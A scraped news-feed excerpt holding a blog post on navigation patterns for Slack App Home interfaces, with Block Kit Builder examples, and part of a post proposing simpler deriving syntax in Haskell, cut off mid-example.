<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><div id="content-inside"><div id="primary"><main id="main" role="main"><article id="post-4294"><div><h3>This is the first post in a new series that will walk through <a href="https://medium.com/slack-developer-blog/theres-no-place-like-home-8a710b614a9d">App Home</a> design and best practices for Slack apps, step by step.</h3><p>When designing a <a href="https://slack.com/">Slack</a> app, you should strive to deliver an intuitive user experience. Slack’s App Home makes it easier than ever to create high-quality user interfaces by borrowing familiar elements from the web.</p><p>For a good experience, users need to be able to navigate smoothly throughout your app.  If they can't get to the important feature you just added without getting frustrated, it wasn’t worth building. Let’s take a look at some of the common patterns for navigation and how to apply them to Slack. These design elements reveal only a single area of content at a time, simplifying the user journey in your app. To demonstrate each style of navigation, we will start with a template provided by Slack and then modify it. Each section will have a <a href="https://app.slack.com/block-kit-builder">Block Kit Builder</a> link so you can try it out yourself. Let's go!</p><h2>Paging</h2><p><a href="https://app.slack.com/block-kit-builder/#%7B%22type%22:%22home%22,%22blocks%22:%5B%7B%22type%22:%22actions%22,%22elements%22:%5B%7B%22type%22:%22static_select%22,%22placeholder%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Choose%20a%20Page%22,%22emoji%22:true%7D,%22options%22:%5B%7B%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Home%22,%22emoji%22:true%7D,%22value%22:%22value-0%22%7D,%7B%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22:boom:%20Approvals%22,%22emoji%22:true%7D,%22value%22:%22value-1%22%7D,%7B%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22All%20Expenses%22,%22emoji%22:true%7D,%22value%22:%22value-2%22%7D,%7B%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Settings%22,%22emoji%22:true%7D,%22value%22:%22value-2%22%7D%5D%7D%5D%7D,%7B%22type%22:%22context%22,%22elements%22:%5B%7B%22type%22:%22image%22,%22image_url%22:%22https://api.slack.com/img/blocks/bkb_template_images/placeholder.png%22,%22alt_text%22:%22placeholder%22%7D%5D%7D,%7B%22type%22:%22section%22,%22text%22:%7B%22type%22:%22mrkdwn%22,%22text%22:%22*Expenses%20Awaiting%20Your%20Approval*%22%7D%7D,%7B%22type%22:%22divider%22%7D,%7B%22type%22:%22context%22,%22elements%22:%5B%7B%22type%22:%22mrkdwn%22,%22text%22:%22Submitted%20by%22%7D,%7B%22type%22:%22image%22,%22image_url%22:%22https://api.slack.com/img/blocks/bkb_template_images/profile_3.png%22,%22alt_text%22:%22Dwight%20Schrute%22%7D,%7B%22type%22:%22mrkdwn%22,%22text%22:%22*Dwight%20Schrute*%22%7D%5D%7D,%7B%22type%22:%22section%22,%22text%22:%7B%22type%22:%22mrkdwn%22,%22text%22:%22*Scuba%20Lessons*%5CnCost:%20*$85.50USD*%5CnDate:%20*10/16/2019*%5CnService%20Provider:%20*Honest%20Sandwiches*%20%20%5CnExpense%20no.%20*%3Cfakelink.toUrl.com%7C#1797PD%3E*%22%7D,%22accessory%22:%7B%22type%22:%22image%22,%22image_url%22:%22https://happybara.io/wp-content/uploads/2020/08/bara-scuba.gif%22,%22alt_text%22:%22credit%20card%22%7D%7D,%7B%22type%22:%22actions%22,%22elements%22:%5B%7B%22type%22:%22button%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Approve%22,%22emoji%22:true%7D,%22style%22:%22primary%22,%22value%22:%22approve%22%7D,%7B%22type%22:%22button%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Decline%22,%22emoji%22:true%7D,%22style%22:%22danger%22,%22value%22:%22decline%22%7D,%7B%22type%22:%22button%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22View%20Details%22,%22emoji%22:true%7D,%22value%22:%22details%22%7D%5D%7D,%7B%22type%22:%22divider%22%7D,%7B%22type%22:%22context%22,%22elements%22:%5B%7B%22type%22:%22mrkdwn%22,%22text%22:%22Submitted%20by%22%7D,%7B%22type%22:%22image%22,%22image_url%22:%22https://api.slack.com/img/blocks/bkb_template_images/profile_2.png%22,%22alt_text%22:%22Pam%20Beasely%22%7D,%7B%22type%22:%22mrkdwn%22,%22text%22:%22*Pam%20Beasely*%22%7D%5D%7D,%7B%22type%22:%22section%22,%22text%22:%7B%22type%22:%22mrkdwn%22,%22text%22:%22*Flights%20to%20New%20York*%5CnCost:%20*$520.78USD*%5CnDate:%20*10/18/2019*%5CnService%20Provider:%20*Delta%20Airways*%5CnExpense%20no.%20*%3Cfakelink.toUrl.com%7C#1803PD%3E*%22%7D,%22accessory%22:%7B%22type%22:%22image%22,%22image_url%22:%22https://happybara.io/wp-content/uploads/2020/02/bara-footer1200x1000.png%22,%22alt_text%22:%22plane%22%7D%7D,%7B%22type%22:%22actions%22,%22elements%22:%5B%7B%22type%22:%22button%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Approve%22,%22emoji%22:true%7D,%22style%22:%22primary%22,%22value%22:%22approve%22%7D,%7B%22type%22:%22button%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Decline%22,%22emoji%22:true%7D,%22style%22:%22danger%22,%22value%22:%22decline%22%7D,%7B%22type%22:%22button%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22View%20Details%22,%22emoji%22:true%7D,%22value%22:%22details%22%7D%5D%7D%5D%7D">Open in Block Kit Builder</a></p><p>Dropdowns are a common utility, and this idea should feel similar to the burger menu popularized by Facebook. Implement paging with either a select menu, so you can customize the placeholder text and have more than five options, or an overflow menu.</p><p><img src="https://happybara.io/wp-content/uploads/2020/09/app-home-nav-pages.jpg" data-src="https://happybara.io/wp-content/uploads/2020/09/app-home-nav-pages.jpg" alt="app home page navigation"></p><h2>Accordion/Collapsible Sections</h2><p><a href="https://app.slack.com/block-kit-builder/#%7B%22type%22:%22home%22,%22blocks%22:%5B%7B%22type%22:%22section%22,%22text%22:%7B%22type%22:%22mrkdwn%22,%22text%22:%22*Budget%20Performance*%22%7D,%22accessory%22:%7B%22type%22:%22button%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22:heavy_plus_sign:%22,%22emoji%22:true%7D,%22value%22:%22app_settings%22%7D%7D,%7B%22type%22:%22divider%22%7D,%7B%22type%22:%22section%22,%22text%22:%7B%22type%22:%22mrkdwn%22,%22text%22:%22*Expenses%20Awaiting%20Your%20Approval*%22%7D,%22accessory%22:%7B%22type%22:%22button%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22:heavy_minus_sign:%22,%22emoji%22:true%7D,%22value%22:%22app_settings%22%7D%7D,%7B%22type%22:%22context%22,%22elements%22:%5B%7B%22type%22:%22mrkdwn%22,%22text%22:%22Submitted%20by%22%7D,%7B%22type%22:%22image%22,%22image_url%22:%22https://api.slack.com/img/blocks/bkb_template_images/profile_3.png%22,%22alt_text%22:%22Dwight%20Schrute%22%7D,%7B%22type%22:%22mrkdwn%22,%22text%22:%22*Dwight%20Schrute*%22%7D%5D%7D,%7B%22type%22:%22section%22,%22text%22:%7B%22type%22:%22mrkdwn%22,%22text%22:%22*Scuba%20Lessons*%5CnCost:%20*$85.50USD*%5CnDate:%20*10/16/2019*%5CnService%20Provider:%20*Honest%20Sandwiches*%20%20%5CnExpense%20no.%20*%3Cfakelink.toUrl.com%7C#1797PD%3E*%22%7D,%22accessory%22:%7B%22type%22:%22image%22,%22image_url%22:%22https://happybara.io/wp-content/uploads/2020/08/bara-scuba.gif%22,%22alt_text%22:%22credit%20card%22%7D%7D,%7B%22type%22:%22actions%22,%22elements%22:%5B%7B%22type%22:%22button%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Approve%22,%22emoji%22:true%7D,%22style%22:%22primary%22,%22value%22:%22approve%22%7D,%7B%22type%22:%22button%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Decline%22,%22emoji%22:true%7D,%22style%22:%22danger%22,%22value%22:%22decline%22%7D,%7B%22type%22:%22button%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22View%20Details%22,%22emoji%22:true%7D,%22value%22:%22details%22%7D%5D%7D,%7B%22type%22:%22divider%22%7D,%7B%22type%22:%22context%22,%22elements%22:%5B%7B%22type%22:%22mrkdwn%22,%22text%22:%22Submitted%20by%22%7D,%7B%22type%22:%22image%22,%22image_url%22:%22https://api.slack.com/img/blocks/bkb_template_images/profile_2.png%22,%22alt_text%22:%22Pam%20Beasely%22%7D,%7B%22type%22:%22mrkdwn%22,%22text%22:%22*Pam%20Beasely*%22%7D%5D%7D,%7B%22type%22:%22section%22,%22text%22:%7B%22type%22:%22mrkdwn%22,%22text%22:%22*Flights%20to%20New%20York*%5CnCost:%20*$520.78USD*%5CnDate:%20*10/18/2019*%5CnService%20Provider:%20*Delta%20Airways*%5CnExpense%20no.%20*%3Cfakelink.toUrl.com%7C#1803PD%3E*%22%7D,%22accessory%22:%7B%22type%22:%22image%22,%22image_url%22:%22https://happybara.io/wp-content/uploads/2020/02/bara-footer1200x1000.png%22,%22alt_text%22:%22plane%22%7D%7D,%7B%22type%22:%22actions%22,%22elements%22:%5B%7B%22type%22:%22button%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Approve%22,%22emoji%22:true%7D,%22style%22:%22primary%22,%22value%22:%22approve%22%7D,%7B%22type%22:%22button%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Decline%22,%22emoji%22:true%7D,%22style%22:%22danger%22,%22value%22:%22decline%22%7D,%7B%22type%22:%22button%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22View%20Details%22,%22emoji%22:true%7D,%22value%22:%22details%22%7D%5D%7D%5D%7D">Open in Block Kit Builder</a></p><p>A classic pattern that makes information accessible without overwhelming users. Everything stays hidden unless the user chooses to dive deeper into a section.</p><p><img src="https://happybara.io/wp-content/uploads/2020/09/app-home-nav-sections.jpg" data-src="https://happybara.io/wp-content/uploads/2020/09/app-home-nav-sections.jpg" alt="app home section navigation"></p><h2>Tab (Button) Navigation</h2><p><a href="https://app.slack.com/block-kit-builder/#%7B%22type%22:%22home%22,%22blocks%22:%5B%7B%22type%22:%22actions%22,%22elements%22:%5B%7B%22type%22:%22button%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Home%22%7D%7D,%7B%22type%22:%22button%22,%22style%22:%22primary%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Approvals%22%7D%7D,%7B%22type%22:%22button%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22All%20Expenses%22%7D%7D,%7B%22type%22:%22button%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Settings%22%7D%7D%5D%7D,%7B%22type%22:%22context%22,%22elements%22:%5B%7B%22type%22:%22image%22,%22image_url%22:%22https://api.slack.com/img/blocks/bkb_template_images/placeholder.png%22,%22alt_text%22:%22placeholder%22%7D%5D%7D,%7B%22type%22:%22section%22,%22text%22:%7B%22type%22:%22mrkdwn%22,%22text%22:%22*Expenses%20Awaiting%20Your%20Approval*%22%7D%7D,%7B%22type%22:%22divider%22%7D,%7B%22type%22:%22context%22,%22elements%22:%5B%7B%22type%22:%22mrkdwn%22,%22text%22:%22Submitted%20by%22%7D,%7B%22type%22:%22image%22,%22image_url%22:%22https://api.slack.com/img/blocks/bkb_template_images/profile_3.png%22,%22alt_text%22:%22Dwight%20Schrute%22%7D,%7B%22type%22:%22mrkdwn%22,%22text%22:%22*Dwight%20Schrute*%22%7D%5D%7D,%7B%22type%22:%22section%22,%22text%22:%7B%22type%22:%22mrkdwn%22,%22text%22:%22*Scuba%20Lessons*%5CnCost:%20*$85.50USD*%5CnDate:%20*10/16/2019*%5CnService%20Provider:%20*Honest%20Sandwiches*%20%20%5CnExpense%20no.%20*%3Cfakelink.toUrl.com%7C#1797PD%3E*%22%7D,%22accessory%22:%7B%22type%22:%22image%22,%22image_url%22:%22https://happybara.io/wp-content/uploads/2020/08/bara-scuba.gif%22,%22alt_text%22:%22credit%20card%22%7D%7D,%7B%22type%22:%22actions%22,%22elements%22:%5B%7B%22type%22:%22button%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Approve%22,%22emoji%22:true%7D,%22style%22:%22primary%22,%22value%22:%22approve%22%7D,%7B%22type%22:%22button%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Decline%22,%22emoji%22:true%7D,%22style%22:%22danger%22,%22value%22:%22decline%22%7D,%7B%22type%22:%22button%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22View%20Details%22,%22emoji%22:true%7D,%22value%22:%22details%22%7D%5D%7D,%7B%22type%22:%22divider%22%7D,%7B%22type%22:%22context%22,%22elements%22:%5B%7B%22type%22:%22mrkdwn%22,%22text%22:%22Submitted%20by%22%7D,%7B%22type%22:%22image%22,%22image_url%22:%22https://api.slack.com/img/blocks/bkb_template_images/profile_2.png%22,%22alt_text%22:%22Pam%20Beasely%22%7D,%7B%22type%22:%22mrkdwn%22,%22text%22:%22*Pam%20Beasely*%22%7D%5D%7D,%7B%22type%22:%22section%22,%22text%22:%7B%22type%22:%22mrkdwn%22,%22text%22:%22*Flights%20to%20New%20York*%5CnCost:%20*$520.78USD*%5CnDate:%20*10/18/2019*%5CnService%20Provider:%20*Delta%20Airways*%5CnExpense%20no.%20*%3Cfakelink.toUrl.com%7C#1803PD%3E*%22%7D,%22accessory%22:%7B%22type%22:%22image%22,%22image_url%22:%22https://happybara.io/wp-content/uploads/2020/02/bara-footer1200x1000.png%22,%22alt_text%22:%22plane%22%7D%7D,%7B%22type%22:%22actions%22,%22elements%22:%5B%7B%22type%22:%22button%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Approve%22,%22emoji%22:true%7D,%22style%22:%22primary%22,%22value%22:%22approve%22%7D,%7B%22type%22:%22button%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Decline%22,%22emoji%22:true%7D,%22style%22:%22danger%22,%22value%22:%22decline%22%7D,%7B%22type%22:%22button%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22View%20Details%22,%22emoji%22:true%7D,%22value%22:%22details%22%7D%5D%7D%5D%7D">Open in Block Kit Builder</a></p><p>Often seen in mobile apps, tab navigation can be accomplished with buttons in App Home.  This style is good for apps that only have a small number of sections as too many buttons (tabs) can appear unwieldy. A possible workaround would be combining tabs with the next idea, modal navigation.  Limit your tabs to just the most crucial, then make a <em>'More Options'</em> tab to show all sections in a modal.  Another alternative is to use buttons for the top sections and an overflow menu for those that remain.</p><p><img src="https://happybara.io/wp-content/uploads/2020/09/app-home-nav-tabs.jpg" data-src="https://happybara.io/wp-content/uploads/2020/09/app-home-nav-tabs.jpg" alt="app home tab navigation"></p><h2>Modal Navigation</h2><p><a href="https://app.slack.com/block-kit-builder/#%7B%22title%22:%7B%22type%22:%22plain_text%22,%22text%22:%22App%20Menu%22,%22emoji%22:true%7D,%22submit%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Submit%22,%22emoji%22:true%7D,%22type%22:%22modal%22,%22close%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Cancel%22,%22emoji%22:true%7D,%22blocks%22:%5B%7B%22type%22:%22section%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22%20%22%7D,%22accessory%22:%7B%22type%22:%22radio_buttons%22,%22initial_option%22:%7B%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Home%22%7D,%22value%22:%22option%201%22,%22description%22:%7B%22type%22:%22plain_text%22,%22text%22:%22%20%20%22%7D%7D,%22options%22:%5B%7B%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Home%22%7D,%22value%22:%22option%201%22,%22description%22:%7B%22type%22:%22plain_text%22,%22text%22:%22%20%20%22%7D%7D,%7B%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Approvals%22%7D,%22value%22:%22option%202%22,%22description%22:%7B%22type%22:%22plain_text%22,%22text%22:%22History%20of%20approvals%22%7D%7D,%7B%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22All%20Expenses%22%7D,%22value%22:%22all_expenses%22,%22description%22:%7B%22type%22:%22plain_text%22,%22text%22:%22View%20details%20and%20approve%20all%20expenses%22%7D%7D,%7B%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Settings%22%7D,%22value%22:%22Settings%22,%22description%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Change%20your%20settings%22%7D%7D%5D%7D%7D,%7B%22type%22:%22divider%22%7D,%7B%22type%22:%22section%22,%22text%22:%7B%22type%22:%22mrkdwn%22,%22text%22:%22*_Get%20in%20touch:_*%22%7D,%22fields%22:%5B%7B%22type%22:%22mrkdwn%22,%22text%22:%22_%3Chttps://happybara.io%7C:writing_hand:%20Blog%3E_%22%7D,%7B%22type%22:%22mrkdwn%22,%22text%22:%22_%3Chttps://twitter.com/happybara_io%7C:woman:%20Facebook%3E_%22%7D,%7B%22type%22:%22mrkdwn%22,%22text%22:%22_%3Chttps://happybara.io%7C:camera:%20Instagram%3E_%22%7D,%7B%22type%22:%22mrkdwn%22,%22text%22:%22_%3Chttps://twitter.com/happybara_io%7C:bird:%20Twitter%3E_%22%7D%5D,%22accessory%22:%7B%22type%22:%22image%22,%22image_url%22:%22https://s3.happybara.io/pool-bara-square.png%22,%22alt_text%22:%22plants%22%7D%7D%5D%7D">Open in Block Kit Builder</a></p><p>To approximate drawer navigation from the web, pop a modal from a button. Drawers let the user focus on choosing where they want to go without any distracting content. There is also room here to gain extra value by adding your branding and contact information. Give <a href="https://uxdesign.cc/rethinking-the-full-screen-menu-59c9c514e43b">this article</a> a quick read if you'd like to learn more about how drawers can be intuitive for users.</p><p><img src="https://happybara.io/wp-content/uploads/2020/09/app-home-nav-modals.jpg" data-src="https://happybara.io/wp-content/uploads/2020/09/app-home-nav-modals.jpg" alt="app home modal navigation"></p><p>Navigation brings your users to all the actions that make them fall in love with your product. Take the time to ensure they aren’t stopped by bad UX before they get there. These ideas are a small sampling of web patterns made possible by Slack’s App Home. If you'd like to learn more about what’s possible in Slack’s App Home, check out their <a href="https://api.slack.com/surfaces/tabs">docs</a>.</p><h2>Interested in seeing App Home navigation done right?</h2><p>Check out <a href="https://happybara.io/">Happybara.io</a>, our Slack apps push the limits of functionality and user-interfaces (they’re also free to install and use).</p><p>To learn more about using and building Slack Apps, <a>subscribe</a> to our mailing list or give us a follow on <a href="https://medium.com/@happybara_io">Medium</a> or <a href="https://twitter.com/happybara_io">Twitter</a>.</p></div></article></main></div></div></div></div>]]>
            </description>
            <link>https://happybara.io/blog/slack-app-home-navigation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25082798</guid>
            <pubDate>Fri, 13 Nov 2020 14:53:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Haskell Proposal: Simplify Deriving]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25082793">thread link</a>) | @JNRowe
<br/>
November 13, 2020 | https://www.parsonsmatt.org/2020/11/10/simplifying_deriving.html | <a href="https://web.archive.org/web/*/https://www.parsonsmatt.org/2020/11/10/simplifying_deriving.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  <p><time>10 Nov 2020</time>
  </p>
  <p>Haskell’s type classes and deriving facilities are a killer feature for type safety and extensibility.
Over nearly 30 years they’ve acquired quite a bit of cruft and language extensions.
With <code>DerivingVia</code>, we now have the ability to dramatically simplify the deriving story.</p>

<p>This post outlines a change to the <em>language</em> that would hopefully be adopted with the next version of the language standard.
They get less reasonable and more dramatic as the post goes on.</p>



<p>GHC has a ton of extensions that only serve to unlock additional type classes to the “stock” deriving strategy.
<code>Derive{Functor,Foldable,Traversable,Generic,Lift,etc}</code>.
We can remove all of these extensions by folding them into the <code>stock</code> deriving strategy.</p>



<p><code>DeriveAnyClass</code> is a footgun.
It allows you to write any type class in a <code>deriving</code> clause.
It pastes in an “empty” instance, relying on <code>DefaultSignatures</code> to fill in the values.</p>

<div><div><pre><code><span>-- With DeriveAnyClass:</span>
<span>data</span> <span>X</span> <span>=</span> <span>X</span>
  <span>deriving</span> <span>ToJSON</span>

<span>-- Without:</span>
<span>data</span> <span>X</span> <span>=</span> <span>X</span>

<span>instance</span> <span>ToJSON</span> <span>X</span>
</code></pre></div></div>



<p><code>DefaultSignatures</code> is used to give a single default implementation of a type class if the underlying type matches a more restrictive constraint.
This is primarily used to provide <code>Generic</code>-based implementations with very little syntax.</p>

<div><div><pre><code><span>data</span> <span>X</span> <span>=</span> <span>X</span> <span>deriving</span> <span>Generic</span>

<span>-- with DefaultSignatures:</span>

<span>class</span> <span>ToJSON</span> <span>a</span> <span>where</span>
    <span>toJSON</span> <span>::</span> <span>a</span> <span>-&gt;</span> <span>Value</span>
    <span>default</span> <span>toJSON</span> <span>::</span> <span>(</span><span>Generic</span> <span>a</span><span>,</span> <span>GToJSON</span> <span>(</span><span>Rep</span> <span>a</span><span>))</span> <span>=&gt;</span> <span>a</span> <span>-&gt;</span> <span>Value</span>
    <span>toJSON</span> <span>=</span> <span>gtoJSON</span> 

<span>instance</span> <span>ToJSON</span> <span>X</span>

<span>-- without DefaultSignatures:</span>

<span>class</span> <span>ToJSON</span> <span>a</span> <span>where</span>
    <span>toJSON</span> <span>::</span> <span>a</span> <span>-&gt;</span> <span>Value</span>

<span>instance</span> <span>ToJSON</span> <span>X</span> <span>where</span>
    <span>toJSON</span> <span>=</span> <span>gtoJSON</span>
</code></pre></div></div>

<p>By privileging a single default, it makes any other possible defaults less useful and less discoverable.</p>

<p>The <code>DeriveAnyClass</code> utility is subsumed by <code>DerivingVia</code>.</p>

<div><div><pre><code><span>newtype</span> <span>Generically</span> <span>a</span> <span>=</span> <span>Generically</span> <span>a</span>

<span>instance</span> <span>(</span><span>Generic</span> <span>a</span><span>,</span> <span>GToJSON</span> <span>(</span><span>Rep</span> <span>a</span><span>))</span> <span>=&gt;</span> <span>ToJSON</span> <span>(</span><span>Generically</span> <span>a</span><span>)</span> <span>where</span>
    <span>toJSON</span> <span>(</span><span>Generically</span> <span>a</span><span>)</span> <span>=</span> <span>gtoJSON</span> <span>a</span>

<span>data</span> <span>X</span> <span>=</span> <span>X</span> 
    <span>deriving</span> <span>stock</span> <span>Generic</span>
    <span>deriving</span> <span>ToJSON</span> <span>via</span> <span>Generically</span> <span>X</span>
</code></pre></div></div>



<p>This extension is subsumed by <code>DerivingVia</code>, also.</p>

<div><div><pre><code><span>-- with GeneralizedNewtypeDeriving</span>
<span>newtype</span> <span>UserId</span> <span>=</span> <span>UserId</span> <span>Text</span>
    <span>deriving</span> <span>newtype</span> <span>(</span><span>Show</span><span>,</span> <span>ToJSON</span><span>)</span>

<span>-- with DerivingVia</span>
<span>newtype</span> <span>UserId</span> <span>=</span> <span>UserId</span> <span>Text</span>
    <span>deriving</span> <span>(</span><span>Show</span><span>,</span> <span>ToJSON</span><span>)</span> <span>via</span> <span>Text</span>
</code></pre></div></div>



<p>Now that there’s only two strategies, we can get rid of <code>DerivingStrategies</code>.</p>

<div><div><pre><code><span>-- Before</span>
<span>data</span> <span>X</span> <span>=</span> <span>X</span>
    <span>deriving</span> <span>stock</span> <span>(</span><span>Show</span><span>,</span> <span>Generic</span><span>)</span>
    <span>deriving</span> <span>(</span><span>ToJSON</span><span>,</span> <span>FromJSON</span><span>)</span> <span>via</span> <span>Generically</span> <span>X</span>

<span>-- After</span>
<span>data</span> <span>X</span> <span>=</span> <span>X</span>
    <span>deriving</span> <span>(</span><span>Show</span><span>,</span> <span>Generic</span><span>)</span>
    <span>deriving</span> <span>(</span><span>ToJSON</span><span>,</span> <span>FromJSON</span><span>)</span> <span>via</span> <span>Generically</span> <span>X</span>
</code></pre></div></div>



<p>Currently, you must write the complete type in a <code>DerivingVia</code> clause.</p>

<div><div><pre><code><span>data</span> <span>X</span> <span>=</span> <span>X</span> 
    <span>deriving</span> <span>Generic</span>
    <span>deriving</span> <span>ToJSON</span> <span>via</span> <span>Generically</span> <span>X</span>

<span>newtype</span> <span>Y</span> <span>=</span> <span>Y</span> <span>Text</span>
    <span>deriving</span> <span>ToJSON</span> <span>via</span> <span>Text</span>
</code></pre></div></div>

<p>This can be cumbersome for a very large type.</p>

<pre><code>newtype App a = App (ExceptT () (StateT () (ReaderT () IO)) a)
    deriving
        ( Functor
        , Applicative
        , Monad
        , MonadReader ()
        , MonadError ()
        , MonadState ()
        )
      via
        ExceptT () (StateT () (ReaderT () IO))
</code></pre>

<p>It’s also annoyingly repetitive, and can lead to errors.</p>

<div><div><pre><code><span>data</span> <span>Foo</span> <span>=</span> <span>Foo</span> 
    <span>deriving</span> <span>Generic</span>
    <span>deriving</span> <span>ToJSON</span> <span>via</span> <span>Generically</span> <span>Foo</span>

<span>-- copy/paste error</span>
<span>data</span> <span>Bar</span> <span>=</span> <span>Bar</span>
    <span>deriving</span> <span>Generic</span>
    <span>deriving</span> <span>ToJSON</span> <span>via</span> <span>Generically</span> <span>Foo</span>
</code></pre></div></div>

<p>A wildcard can be used to indicate either:</p>

<p>a. The underlying type of a <code>newtype</code>, or 
b. The type of the <code>data</code> declaration.</p>

<div><div><pre><code><span>data</span> <span>Foo</span> <span>=</span> <span>Foo</span>
    <span>deriving</span> <span>Generic</span>
    <span>deriving</span> <span>ToJSON</span> <span>via</span> <span>Generically</span> <span>_</span>

<span>-- no more copy paste error</span>
<span>data</span> <span>Bar</span> <span>=</span> <span>Bar</span>
    <span>deriving</span> <span>Generic</span>
    <span>deriving</span> <span>ToJSON</span> <span>via</span> <span>Generically</span> <span>_</span>

<span>-- mmmm nice and clean</span>
<span>newtype</span> <span>App</span> <span>a</span> <span>=</span> <span>App</span> <span>(</span><span>ExceptT</span> <span>()</span> <span>(</span><span>StateT</span> <span>()</span> <span>(</span><span>ReaderT</span> <span>()</span> <span>IO</span><span>))</span> <span>a</span><span>)</span>
    <span>deriving</span>
        <span>(</span> <span>Functor</span>
        <span>,</span> <span>Applicative</span>
        <span>,</span> <span>Monad</span>
        <span>,</span> <span>MonadReader</span> <span>()</span>
        <span>,</span> <span>MonadError</span> <span>()</span>
        <span>,</span> <span>MonadState</span> <span>()</span>
        <span>)</span>
      <span>via</span> <span>_</span>
</code></pre></div></div>



<p>There are two ways to derive things: <code>StandaloneDeriving</code> and attached deriving.
Attached deriving is redundant, but convenient.
<code>StandaloneDeriving</code> is more powerful, but less convenient.
Attached deriving clauses don’t work with <code>GADTs</code>.</p>

<div><div><pre><code><span>-- Before:</span>
<span>data</span> <span>Foo</span> <span>=</span> <span>Foo</span>
    <span>deriving</span> <span>Generic</span>
    <span>deriving</span> <span>(</span><span>FromJSON</span><span>,</span> <span>ToJSON</span><span>)</span> <span>via</span> <span>Generically</span> <span>_</span>
    
<span>newtype</span> <span>App</span> <span>a</span> <span>=</span> <span>App</span> <span>(</span><span>ExceptT</span> <span>()</span> <span>(</span><span>StateT</span> <span>()</span> <span>(</span><span>ReaderT</span> <span>()</span> <span>IO</span><span>))</span> <span>a</span><span>)</span>
    <span>deriving</span>
        <span>(</span> <span>Functor</span>
        <span>,</span> <span>Applicative</span>
        <span>,</span> <span>Monad</span>
        <span>,</span> <span>MonadReader</span> <span>()</span>
        <span>,</span> <span>MonadError</span> <span>()</span>
        <span>,</span> <span>MonadState</span> <span>()</span>
        <span>)</span>
      <span>via</span> <span>_</span>

<span>-- Only standalone:</span>
<span>data</span> <span>Foo</span> <span>=</span> <span>Foo</span>

<span>deriving</span> <span>instance</span> <span>Generic</span> <span>Foo</span>
<span>deriving</span> <span>via</span> <span>Generically</span> <span>_</span> <span>instance</span> <span>ToJSON</span> <span>Foo</span>
<span>deriving</span> <span>via</span> <span>Generically</span> <span>_</span> <span>instance</span> <span>FromJSON</span> <span>Foo</span>

<span>newtype</span> <span>App</span> <span>a</span> <span>=</span> <span>App</span> <span>...</span>

<span>deriving</span> <span>via</span> <span>_</span> <span>instance</span> <span>Functor</span> <span>App</span>
<span>deriving</span> <span>via</span> <span>_</span> <span>instance</span> <span>Applicative</span> <span>App</span>
<span>deriving</span> <span>via</span> <span>_</span> <span>instance</span> <span>Monad</span> <span>App</span>
<span>deriving</span> <span>via</span> <span>_</span> <span>instance</span> <span>MonadReader</span> <span>()</span> <span>App</span>
<span>deriving</span> <span>via</span> <span>_</span> <span>instance</span> <span>MonadError</span> <span>()</span> <span>App</span>
<span>deriving</span> <span>via</span> <span>_</span> <span>instance</span> <span>MonadState</span> <span>()</span> <span>App</span>

<span>-- GADT must use standalone to specify a context</span>
<span>data</span> <span>Some</span> <span>f</span> <span>where</span>
    <span>Some</span> <span>::</span> <span>Show</span> <span>a</span> <span>=&gt;</span> <span>f</span> <span>a</span> <span>-&gt;</span> <span>Some</span> <span>f</span>

<span>deriving</span> <span>instance</span> <span>(</span><span>forall</span> <span>a</span><span>.</span> <span>Show</span> <span>a</span> <span>=&gt;</span> <span>Show</span> <span>(</span><span>f</span> <span>a</span><span>))</span> <span>=&gt;</span> <span>Show</span> <span>(</span><span>Some</span> <span>f</span><span>)</span>
</code></pre></div></div>



<p>The problem with the above proposal is that it carries a significant syntax cost.
The keyword <code>deriving</code> is repeated for each instance, the keyword <code>instance</code> is repeated, the <code>via _</code> clause is repeated, and the type name is repeated.
Multiple instances should be derivable with the same context.</p>

<div><div><pre><code><span>data</span> <span>Foo</span> <span>=</span> <span>Foo</span>

<span>deriving</span> <span>Foo</span> 
    <span>(</span> <span>Generic</span>
    <span>,</span> <span>via</span> 
        <span>(</span><span>Generically</span> <span>_</span><span>)</span>
        <span>(</span> <span>ToJSON</span>
        <span>,</span> <span>FromJSON</span>
